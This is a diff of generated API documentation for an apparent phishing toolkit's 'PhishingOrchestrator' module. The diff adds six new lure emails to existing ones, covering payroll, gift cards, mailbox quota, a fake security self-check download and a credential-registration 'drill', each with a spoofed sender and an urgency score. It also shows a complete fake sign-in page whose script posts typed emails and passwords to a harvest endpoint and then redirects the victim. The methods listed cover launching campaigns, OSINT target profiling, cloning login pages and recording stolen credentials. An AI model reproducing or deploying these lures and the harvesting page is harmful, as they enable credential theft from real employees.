@@ -215,7 +215,7 @@ Public methods:
 
 | Name | Type | Default | Description |
 |---|---|---|---|
-| [`BUILTIN_TEMPLATES`](#phishingorchestrator-builtin_templates) |  | `{'microsoft_365_login': {'subject': 'Action Required: Your Microsoft 365 Password Expires Today', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>Your Microsoft 365 password expires today. Please update your\npassword immediately to avoid losing access to your email and files.</p>\n<p><a href="{phishing_url}">Update Password Now</a></p>\n<p><small>This is an automated notification from your IT department.</small></p>\n</body></html>', 'sender_display': 'Microsoft 365 Admin <no-reply@microsoftonline.com>', 'urgency_score': 8}, 'sharepoint_share': {'subject': '{sender_name} shared a document with you', 'body_html': '\n<html><body>\n<p>Hi {first_name},</p>\n<p>{sender_name} shared a confidential document with you:</p>\n<p><a href="{phishing_url}">Annual_Report_2025_Q1.xlsx</a></p>\n<p><small>Shared via SharePoint Online</small></p>\n</body></html>', 'sender_display': 'SharePoint Online <no-reply@sharepointonline.com>', 'urgency_score': 5}, 'password_reset': {'subject': 'IT Security: Mandatory Password Reset Required', 'body_html': '\n<html><body>\n<p>Hello {first_name},</p>\n<p>Our security team has detected unusual activity on your account. As a\nprecaution, a mandatory password reset has been initiated.</p>\n<p><a href="{phishing_url}">Reset Your Password Securely</a></p>\n<p>This link expires in 24 hours.</p>\n</body></html>', 'sender_display': 'IT Security <security@{target_domain}>', 'urgency_score': 9}, 'voicemail_notification': {'subject': 'New Voicemail from {sender_name} ({duration}s)', 'body_html': '\n<html><body>\n<p>You have a new voicemail message:</p>\n<p>From: {sender_name}</p>\n<p>Duration: {duration}s</p>\n<p><a href="{phishing_url}">Listen to Voicemail</a></p>\n</body></html>', 'sender_display': 'Voicemail System <voicemail@{target_domain}>', 'urgency_score': 4}, 'hr_policy_update': {'subject': 'Important: Updated Employee Handbook & Policy Changes', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>Human Resources has published updates to the Employee Handbook and\ncompany policies effective immediately. All employees are required to\nacknowledge these changes.</p>\n<p><a href="{phishing_url}">Review & Acknowledge Policy Updates</a></p>\n<p><small>Human Resources Department</small></p>\n</body></html>', 'sender_display': 'Human Resources <hr@{target_domain}>', 'urgency_score': 6}}` |  |
+| [`BUILTIN_TEMPLATES`](#phishingorchestrator-builtin_templates) |  | `{'microsoft_365_login': {'subject': 'Action Required: Your Microsoft 365 Password Expires Today', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>Your Microsoft 365 password expires today. Please update your\npassword immediately to avoid losing access to your email and files.</p>\n<p><a href="{phishing_url}">Update Password Now</a></p>\n<p><small>This is an automated notification from your IT department.</small></p>\n</body></html>', 'sender_display': 'Microsoft 365 Admin <no-reply@microsoftonline.com>', 'urgency_score': 8}, 'sharepoint_share': {'subject': '{sender_name} shared a document with you', 'body_html': '\n<html><body>\n<p>Hi {first_name},</p>\n<p>{sender_name} shared a confidential document with you:</p>\n<p><a href="{phishing_url}">Annual_Report_2025_Q1.xlsx</a></p>\n<p><small>Shared via SharePoint Online</small></p>\n</body></html>', 'sender_display': 'SharePoint Online <no-reply@sharepointonline.com>', 'urgency_score': 5}, 'password_reset': {'subject': 'IT Security: Mandatory Password Reset Required', 'body_html': '\n<html><body>\n<p>Hello {first_name},</p>\n<p>Our security team has detected unusual activity on your account. As a\nprecaution, a mandatory password reset has been initiated.</p>\n<p><a href="{phishing_url}">Reset Your Password Securely</a></p>\n<p>This link expires in 24 hours.</p>\n</body></html>', 'sender_display': 'IT Security <security@{target_domain}>', 'urgency_score': 9}, 'voicemail_notification': {'subject': 'New Voicemail from {sender_name} ({duration}s)', 'body_html': '\n<html><body>\n<p>You have a new voicemail message:</p>\n<p>From: {sender_name}</p>\n<p>Duration: {duration}s</p>\n<p><a href="{phishing_url}">Listen to Voicemail</a></p>\n</body></html>', 'sender_display': 'Voicemail System <voicemail@{target_domain}>', 'urgency_score': 4}, 'hr_policy_update': {'subject': 'Important: Updated Employee Handbook & Policy Changes', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>Human Resources has published updates to the Employee Handbook and\ncompany policies effective immediately. All employees are required to\nacknowledge these changes.</p>\n<p><a href="{phishing_url}">Review & Acknowledge Policy Updates</a></p>\n<p><small>Human Resources Department</small></p>\n</body></html>', 'sender_display': 'Human Resources <hr@{target_domain}>', 'urgency_score': 6}, 'payroll_adjustment': {'subject': 'Confidential: Salary Structure Adjustments Effective Next Month', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>Payroll has completed the yearly salary structure review. Your new\ncompensation sheet is attached to the secure portal and requires your\nacknowledgement before the next payroll cycle.</p>\n<p><a href="{phishing_url}">Open Your Compensation Sheet</a></p>\n<p><small>Payroll and Benefits Department</small></p>\n</body></html>', 'sender_display': 'Payroll Department <payroll@{target_domain}>', 'urgency_score': 7}, 'holiday_benefits': {'subject': 'Holiday Benefit Package: Claim Your Gift Card Before Expiry', 'body_html': '\n<html><body>\n<p>Hi {first_name},</p>\n<p>As part of this season\'s benefit package, employees can claim one\ngift card while stock lasts. Registration closes at the end of the week.</p>\n<p><a href="{phishing_url}">Claim Your Benefit Package</a></p>\n<p><small>Employee Benefits Portal</small></p>\n</body></html>', 'sender_display': 'Employee Benefits <benefits@{target_domain}>', 'urgency_score': 7}, 'job_application': {'subject': 'Candidate Application Received: Confirm Interview Slot', 'body_html': '\n<html><body>\n<p>Hello,</p>\n<p>The recruitment team received your application and can offer two\ninterview slots. Confirm your availability through the scheduling portal\nwithin 48 hours or the application will be archived.</p>\n<p><a href="{phishing_url}">Confirm Interview Slot</a></p>\n<p><small>Recruitment Team</small></p>\n</body></html>', 'sender_display': 'Talent Acquisition <talent@{target_domain}>', 'urgency_score': 8}, 'mailbox_quota': {'subject': 'Mailbox Capacity Upgrade: Action Required Today', 'body_html': '\n<html><body>\n<p>Hi {first_name},</p>\n<p>Your mailbox has reached {quota_percent}% of its storage quota.\nApprove the free capacity upgrade today to avoid delivery interruptions\nand losing mailbox access.</p>\n<p><a href="{phishing_url}">Upgrade Mailbox Capacity</a></p>\n<p><small>Mail Server Administration</small></p>\n</body></html>', 'sender_display': 'Mail Administrator <postmaster@{target_domain}>', 'urgency_score': 9}, 'vuln_selfcheck': {'subject': 'Security Notice: Critical Vulnerability Self-Check Tool Required', 'body_html': '\n<html><body>\n<p>Dear {first_name},</p>\n<p>The security team has detected active exploitation of a critical\nvulnerability affecting internal workstations. Every endpoint must run\nthe mandatory self-check utility before the next VPN session.</p>\n<p><a href="{phishing_url}">Download the Self-Check Utility</a></p>\n<p><small>Security Operations Center</small></p>\n</body></html>', 'sender_display': 'Security Operations <soc@{target_domain}>', 'urgency_score': 10}, 'drill_notice': {'subject': 'Upcoming Security Drill: Register Your Response Account', 'body_html': '\n<html><body>\n<p>Hello {first_name},</p>\n<p>An organisation-wide security drill starts this week. Register your\nresponse account with your corporate credentials so the monitoring\nteam can track your participation status.</p>\n<p><a href="{phishing_url}">Register Your Response Account</a></p>\n<p><small>Security Awareness Team</small></p>\n</body></html>', 'sender_display': 'Security Awareness <awareness@{target_domain}>', 'urgency_score': 6}}` |  |
 | [`DEFAULT_LANDING_PAGE`](#phishingorchestrator-default_landing_page) |  | `'\n<!DOCTYPE html>\n<html>\n<head>\n <meta charset="UTF-8">\n <title>{page_title}</title>\n <style>\n * {{ margin: 0; padding: 0; box-sizing: border-box; }}\n body {{ font-family: \'Segoe UI\', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}\n .login-box {{ background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 2rem; width: 400px; max-width: 90%; }}\n .logo {{ text-align: center; margin-bottom: 1.5rem; font-size: 1.5rem; color: #1b1b1b; }}\n .logo img {{ height: 40px; }}\n h2 {{ font-size: 1.2rem; margin-bottom: 0.5rem; color: #1b1b1b; }}\n p {{ color: #5e5e5e; margin-bottom: 1.5rem; font-size: 0.9rem; }}\n input {{ width: 100%; padding: 10px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 4px; font-size: 0.95rem; }}\n input:focus {{ outline: none; border-color: {accent_color}; }}\n button {{ width: 100%; padding: 12px; background: {accent_color}; color: #fff; border: none; border-radius: 4px; font-size: 1rem; cursor: pointer; }}\n button:hover {{ opacity: 0.9; }}\n .error {{ color: #e81123; font-size: 0.8rem; margin-bottom: 0.5rem; display: none; }}\n .footer {{ text-align: center; margin-top: 1rem; font-size: 0.75rem; color: #999; }}\n </style>\n</head>\n<body>\n <div class="login-box">\n <div class="logo">{logo_html}</div>\n <h2>Sign in</h2>\n <p>to continue to {service_name}</p>\n <div class="error" id="error">Incorrect email or password. Please try again.</div>\n <form id="loginForm" method="POST" action="{harvest_endpoint}">\n <input type="email" name="email" id="email" placeholder="Email, phone, or Skype" required>\n <input type="password" name="password" id="password" placeholder="Password" required>\n <button type="submit">Sign in</button>\n </form>\n <div class="footer">&copy; {year} {company_name}. All rights reserved.</div>\n </div>\n <script>\n document.getElementById(\'loginForm\').addEventListener(\'submit\', async function(e) {{\n e.preventDefault();\n const email = document.getElementById(\'email\').value;\n const password = document.getElementById(\'password\').value;\n try {{\n await fetch(\'{harvest_endpoint}\', {{\n method: \'POST\',\n headers: {{ \'Content-Type\': \'application/json\' }},\n body: JSON.stringify({{ email, password }})\n }});\n }} catch (err) {{}}\n document.getElementById(\'error\').style.display = \'block\';\n setTimeout(() => {{ window.location.href = \'{redirect_url}\'; }}, 2000);\n }});\n </script>\n</body>\n</html>\n'` |  |
 
 **Members**
@@ -236,7 +236,7 @@ Public methods:
 
 #### `PhishingOrchestrator.__init__`
 
-`constructor` | [modules/phishing_orchestrator.py:316](../../modules/phishing_orchestrator.py#L316)
+`constructor` | [modules/phishing_orchestrator.py:399](../../modules/phishing_orchestrator.py#L399)
 
 ```python
 def __init__(self) -> None
@@ -246,7 +246,7 @@ def __init__(self) -> None
 
 #### `PhishingOrchestrator.get_instance`
 
-`classmethod` | [modules/phishing_orchestrator.py:321](../../modules/phishing_orchestrator.py#L321)
+`classmethod` | [modules/phishing_orchestrator.py:404](../../modules/phishing_orchestrator.py#L404)
 
 Decorators: `@classmethod`
 
@@ -256,11 +256,13 @@ def get_instance(cls) -> PhishingOrchestrator
 
 **Returns:** `PhishingOrchestrator`
 
+*Called by:* [`run_fallback`](modules.lazypoophish.py.md#run_fallback)
+
 <a id="phishingorchestrator-launch"></a>
 
 #### `PhishingOrchestrator.launch`
 
-`method` | [modules/phishing_orchestrator.py:332](../../modules/phishing_orchestrator.py#L332)
+`method` | [modules/phishing_orchestrator.py:415](../../modules/phishing_orchestrator.py#L415)
 
 ```python
 def launch(self, target_domain: str, template: str = 'microsoft_365_login', mode: str = 'credential_harvest', targets_file: str = '', sender_email: str = '', sender_password: str = '', smtp_host: str = '', smtp_port: int = 587) -> str
@@ -289,7 +291,7 @@ Launch a phishing campaign.
 
 #### `PhishingOrchestrator.profile_targets`
 
-`method` | [modules/phishing_orchestrator.py:441](../../modules/phishing_orchestrator.py#L441)
+`method` | [modules/phishing_orchestrator.py:524](../../modules/phishing_orchestrator.py#L524)
 
 ```python
 def profile_targets(self, domain: str) -> list[CampaignTarget]
@@ -313,7 +315,7 @@ Profile targets for a domain using OSINT techniques.
 
 #### `PhishingOrchestrator.generate_template`
 
-`method` | [modules/phishing_orchestrator.py:486](../../modules/phishing_orchestrator.py#L486)
+`method` | [modules/phishing_orchestrator.py:569](../../modules/phishing_orchestrator.py#L569)
 
 ```python
 def generate_template(self, name: str, target_domain: str = '', context: dict[str, str] | None = None) -> PhishingTemplate
@@ -339,7 +341,7 @@ Generate or retrieve a phishing template.
 
 #### `PhishingOrchestrator.clone_landing_page`
 
-`method` | [modules/phishing_orchestrator.py:533](../../modules/phishing_orchestrator.py#L533)
+`method` | [modules/phishing_orchestrator.py:616](../../modules/phishing_orchestrator.py#L616)
 
 ```python
 def clone_landing_page(self, url: str) -> str
@@ -359,7 +361,7 @@ Clone a target login page for credential harvesting.
 
 #### `PhishingOrchestrator.get_results`
 
-`method` | [modules/phishing_orchestrator.py:560](../../modules/phishing_orchestrator.py#L560)
+`method` | [modules/phishing_orchestrator.py:643](../../modules/phishing_orchestrator.py#L643)
 
 ```python
 def get_results(self, campaign_id: str) -> CampaignResult
@@ -381,7 +383,7 @@ Get campaign results.
 
 #### `PhishingOrchestrator.record_click`
 
-`method` | [modules/phishing_orchestrator.py:584](../../modules/phishing_orchestrator.py#L584)
+`method` | [modules/phishing_orchestrator.py:667](../../modules/phishing_orchestrator.py#L667)
 
 ```python
 def record_click(self, campaign_id: str, email: str) -> None
@@ -400,7 +402,7 @@ Record a link click.
 
 #### `PhishingOrchestrator.record_credentials`
 
-`method` | [modules/phishing_orchestrator.py:605](../../modules/phishing_orchestrator.py#L605)
+`method` | [modules/phishing_orchestrator.py:688](../../modules/phishing_orchestrator.py#L688)
 
 ```python
 def record_credentials(self, campaign_id: str, email: str, password: str) -> None
